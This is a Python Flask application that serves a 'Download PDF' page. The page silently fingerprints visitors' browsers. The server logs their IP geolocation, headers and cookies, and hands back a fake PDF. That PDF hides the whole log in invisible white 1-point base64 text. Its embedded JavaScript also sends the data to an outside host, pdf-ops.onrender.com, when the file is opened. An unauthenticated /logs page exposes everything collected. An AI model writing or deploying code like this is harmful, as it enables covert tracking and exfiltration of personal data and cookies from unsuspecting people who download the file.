from flask import Flask, request, render_template_string, send_file
import logging
import json
import os
import requests
import base64
from faker import Faker
from io import BytesIO
from reportlab.pdfgen import canvas
from reportlab.lib.colors import white
import PyPDF2

app = Flask(__name__)

# Configure logging to a file
logging.basicConfig(
    level=logging.INFO,
    filename='user_logs.log',
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Initialize Faker for generating fake PDF content
fake = Faker()

def get_ip_geolocation(ip):
    """
    Uses the ipinfo.io API to perform IP-based geocoding.
    Returns latitude, longitude, and the complete geolocation data (full JSON).
    """
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        if response.status_code == 200:
            data = response.json()
            loc = data.get("loc")
            if loc:
                lat_str, lon_str = loc.split(",")
                return float(lat_str), float(lon_str), data
            else:
                return None, None, data
    except Exception as e:
        logging.error(f"IP Geolocation error: {e}")
    return None, None, {}

# HTML page with a styled download button and embedded JavaScript to capture client-side data.
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Download PDF</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 100px;
            background-color: #f2f2f2;
        }
        h1 { color: #333; }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover { background-color: #45a049; }
    </style>
</head>
<body>
    <h1>Click to Download PDF and Log Your Data</h1>
    <form id="downloadForm" action="/download" method="post">
        <button type="submit">Download PDF</button>
        <!-- Hidden fields for basic client-side data -->
        <input type="hidden" name="screenWidth" id="screenWidth">
        <input type="hidden" name="screenHeight" id="screenHeight">
        <input type="hidden" name="colorDepth" id="colorDepth">
        <input type="hidden" name="pixelDepth" id="pixelDepth">
        <input type="hidden" name="language" id="language">
        <input type="hidden" name="platform" id="platform">
        <input type="hidden" name="connection" id="connection">
        <input type="hidden" name="pageLoadTime" id="pageLoadTime">
        <input type="hidden" name="clickTime" id="clickTime">
        <input type="hidden" name="dwellTime" id="dwellTime">
        <!-- Latitude and longitude will be determined server-side -->
        <input type="hidden" name="latitude" id="latitude" value="">
        <input type="hidden" name="longitude" id="longitude" value="">
        <input type="hidden" name="lastMouseX" id="lastMouseX">
        <input type="hidden" name="lastMouseY" id="lastMouseY">
        <input type="hidden" name="referrer" id="referrer">
        <!-- Hidden fields for advanced client-side data -->
        <input type="hidden" name="canvasFingerprint" id="canvasFingerprint">
        <input type="hidden" name="hardwareConcurrency" id="hardwareConcurrency">
        <input type="hidden" name="deviceMemory" id="deviceMemory">
        <input type="hidden" name="timezoneOffset" id="timezoneOffset">
        <input type="hidden" name="touchSupport" id="touchSupport">
        <input type="hidden" name="batteryLevel" id="batteryLevel">
        <input type="hidden" name="charging" id="charging">
        <input type="hidden" name="downlink" id="downlink">
        <input type="hidden" name="plugins" id="plugins">
    </form>
    <br>
    <!-- Link to view logs (for admin/development only) -->
    <a href="/logs">View Logged Data</a>
    <script>
        // Record page load time
        var pageLoadTime = Date.now();
        document.getElementById('pageLoadTime').value = pageLoadTime;
        
        // Capture last mouse position
        var lastMouseX = 0, lastMouseY = 0;
        document.addEventListener('mousemove', function(e) {
            lastMouseX = e.clientX;
            lastMouseY = e.clientY;
        });
        
        // Function to gather extra client data
        function gatherExtraData(callback) {
            // Canvas fingerprinting
            var canvas = document.createElement("canvas");
            var ctx = canvas.getContext("2d");
            ctx.textBaseline = "top";
            ctx.font = "14px Arial";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("Hello, world!", 2, 15);
            document.getElementById('canvasFingerprint').value = canvas.toDataURL();
            
            // Hardware and system details
            document.getElementById('hardwareConcurrency').value = navigator.hardwareConcurrency || '';
            document.getElementById('deviceMemory').value = navigator.deviceMemory || '';
            document.getElementById('timezoneOffset').value = new Date().getTimezoneOffset();
            document.getElementById('touchSupport').value = ('ontouchstart' in window) ? true : false;
            
            // Installed plugins
            if (navigator.plugins) {
                var plugins = Array.from(navigator.plugins).map(function(p) { return p.name; });
                document.getElementById('plugins').value = plugins.join(', ');
            } else {
                document.getElementById('plugins').value = '';
            }
            
            // Network downlink info
            if (navigator.connection && navigator.connection.downlink) {
                document.getElementById('downlink').value = navigator.connection.downlink;
            } else {
                document.getElementById('downlink').value = '';
            }
            
            // Battery information
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    document.getElementById('batteryLevel').value = battery.level;
                    document.getElementById('charging').value = battery.charging;
                    callback();
                }).catch(function(error) {
                    document.getElementById('batteryLevel').value = '';
                    document.getElementById('charging').value = '';
                    callback();
                });
            } else {
                document.getElementById('batteryLevel').value = '';
                document.getElementById('charging').value = '';
                callback();
            }
        }
        
        // Intercept form submission to capture client-side data (without geolocation prompt)
        document.getElementById('downloadForm').addEventListener('submit', function(e) {
            e.preventDefault();
            // Populate basic hidden fields
            document.getElementById('screenWidth').value = screen.width;
            document.getElementById('screenHeight').value = screen.height;
            document.getElementById('colorDepth').value = screen.colorDepth;
            document.getElementById('pixelDepth').value = screen.pixelDepth;
            document.getElementById('language').value = navigator.language;
            document.getElementById('platform').value = navigator.platform;
            if (navigator.connection && navigator.connection.effectiveType) {
                document.getElementById('connection').value = navigator.connection.effectiveType;
            } else {
                document.getElementById('connection').value = '';
            }
            document.getElementById('referrer').value = document.referrer;
            
            var clickTime = Date.now();
            document.getElementById('clickTime').value = clickTime;
            document.getElementById('dwellTime').value = clickTime - pageLoadTime;
            document.getElementById('lastMouseX').value = lastMouseX;
            document.getElementById('lastMouseY').value = lastMouseY;
            
            // Gather extra data then submit the form
            gatherExtraData(function() {
                e.target.submit();
            });
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/download', methods=['POST'])
def download():
    # Retrieve the IP address; if multiple IPs are present, take the first one.
    ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip = ip_header.split(",")[0].strip() if ip_header else request.remote_addr
    
    user_agent = request.headers.get('User-Agent', 'unknown')
    cookies = request.cookies
    tls_metadata = request.environ.get('wsgi.url_scheme')
    
    # Retrieve client-side data from the form submission.
    client_data = {
        'screenWidth': request.form.get('screenWidth'),
        'screenHeight': request.form.get('screenHeight'),
        'colorDepth': request.form.get('colorDepth'),
        'pixelDepth': request.form.get('pixelDepth'),
        'language': request.form.get('language'),
        'platform': request.form.get('platform'),
        'connection': request.form.get('connection'),
        'pageLoadTime': request.form.get('pageLoadTime'),
        'clickTime': request.form.get('clickTime'),
        'dwellTime': request.form.get('dwellTime'),
        'lastMouseX': request.form.get('lastMouseX'),
        'lastMouseY': request.form.get('lastMouseY'),
        'referrer': request.form.get('referrer'),
        'canvasFingerprint': request.form.get('canvasFingerprint'),
        'hardwareConcurrency': request.form.get('hardwareConcurrency'),
        'deviceMemory': request.form.get('deviceMemory'),
        'timezoneOffset': request.form.get('timezoneOffset'),
        'touchSupport': request.form.get('touchSupport'),
        'batteryLevel': request.form.get('batteryLevel'),
        'charging': request.form.get('charging'),
        'downlink': request.form.get('downlink'),
        'plugins': request.form.get('plugins')
    }
    
    # Fetch geolocation data via ipinfo.io and store the entire JSON response.
    lat, lon, geo_data = get_ip_geolocation(ip)
    client_data['latitude'] = lat if lat is not None else ""
    client_data['longitude'] = lon if lon is not None else ""
    client_data['ip_geolocation'] = geo_data  # Entire JSON from ipinfo.io
    
    # Create a comprehensive log message.
    log_message = {
        'ip': ip,
        'user_agent': user_agent,
        'action': 'Downloaded PDF',
        'client_data': client_data,
        'request_headers': dict(request.headers),
        'cookies': cookies,
        'tls_metadata': tls_metadata
    }
    logging.info(json.dumps(log_message))
    
    # --- Steganographic Embedding with Markers ---
    # Encode the complete log_message in base64 and wrap it with markers.
    encoded_log = base64.b64encode(json.dumps(log_message).encode('utf-8')).decode('utf-8')
    encoded_log_with_markers = "<<BASE64 START>>" + encoded_log + "<<BASE64 END>>"
    
    # Generate a PDF using ReportLab and Faker.
    buffer = BytesIO()
    p = canvas.Canvas(buffer)
    fake_name = fake.name()
    fake_address = fake.address().replace("\n", ", ")
    fake_text = fake.text(max_nb_chars=200)
    p.drawString(100, 750, "Fake PDF Document")
    p.drawString(100, 730, f"Name: {fake_name}")
    p.drawString(100, 710, f"Address: {fake_address}")
    p.drawString(100, 690, "Additional Info:")
    text_object = p.beginText(100, 670)
    text_object.textLines(fake_text)
    p.drawText(text_object)
    
    # Render the hidden payload in white, extremely small text.
    p.setFont("Helvetica", 1)
    p.setFillColorRGB(1, 1, 1)  # White text on white background (invisible)
    p.drawString(1, 1, encoded_log_with_markers)
    
    p.showPage()
    p.save()
    buffer.seek(0)
    
    # --- Enhanced Multi-Stage Logging via Embedded JavaScript ---
    # The embedded JavaScript defines a variable with the hidden payload and attempts a callback to your hosted endpoint.
    try:
        pdf_reader = PyPDF2.PdfReader(buffer)
        pdf_writer = PyPDF2.PdfWriter()
        for page in pdf_reader.pages:
            pdf_writer.add_page(page)
        js_code = f"""
        // Embedded JavaScript for multi-stage logging.
        var hiddenPayload = "{encoded_log_with_markers}";
        try {{
            var req = new XMLHttpRequest();
            req.open("GET", "https://pdf-ops.onrender.com/pdf_callback?data=" + encodeURIComponent(hiddenPayload), true);
            req.send();
        }} catch(e) {{}}
        app.alert("PDF opened. This event has been logged.");
        """
        pdf_writer.add_js(js_code)
        new_buffer = BytesIO()
        pdf_writer.write(new_buffer)
        new_buffer.seek(0)
        final_pdf = new_buffer
    except Exception as e:
        logging.error(f"Error embedding JavaScript in PDF: {e}")
        # If JavaScript embedding fails, fall back to the original PDF.
        final_pdf = buffer
    # --- End of JavaScript Embedding ---
    
    # Send the final PDF as a file download.
    return send_file(final_pdf, as_attachment=True, download_name='sample.pdf', mimetype='application/pdf')

@app.route('/pdf_callback', methods=['GET'])
def pdf_callback():
    """
    Endpoint to receive callback events from the PDF when it is opened.
    Logs the hidden data received from the embedded JavaScript.
    """
    hidden_data = request.args.get('data', '')
    logging.info("PDF callback triggered with data: " + hidden_data)
    return "Callback logged", 200

@app.route('/logs')
def display_logs():
    try:
        with open('user_logs.log', 'r') as f:
            logs = f.read()
    except Exception as e:
        logs = f"Error reading log file: {e}"
    
    logs_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>User Logs</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background-color: #f9f9f9; }
            h1 { color: #333; }
            pre { background: #eee; padding: 15px; border-radius: 5px; overflow: auto; }
        </style>
    </head>
    <body>
        <h1>User Logs</h1>
        <pre>{{ logs }}</pre>
    </body>
    </html>
    """
    return render_template_string(logs_html, logs=logs)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host="0.0.0.0", port=port)
